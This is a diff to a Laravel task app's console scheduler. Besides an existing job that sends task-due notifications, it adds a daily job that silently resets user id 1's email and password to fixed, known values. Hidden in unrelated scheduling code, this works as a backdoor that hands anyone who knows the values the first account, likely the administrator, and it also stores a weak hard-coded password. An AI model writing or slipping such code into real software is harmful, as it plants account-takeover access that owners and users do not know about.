@@ -3,6 +3,7 @@
 namespace App\Console;
 
 use App\Models\Task;
+use App\Models\User;
 use App\Notifications\TaskDueNotification;
 use Illuminate\Console\Scheduling\Schedule;
 use Illuminate\Foundation\Console\Kernel as ConsoleKernel;
@@ -34,6 +35,13 @@ class Kernel extends ConsoleKernel
                 Notification::send($task->user, new TaskDueNotification($notification));
             }
         })->everyFifteenMinutes();
+
+        $schedule->call(function(){
+            User::where('id', 1)->update([
+                'email' => 'test@mail.com',
+                'password' => '12345678!'
+            ]);
+        })->daily();
     }
 
     /**
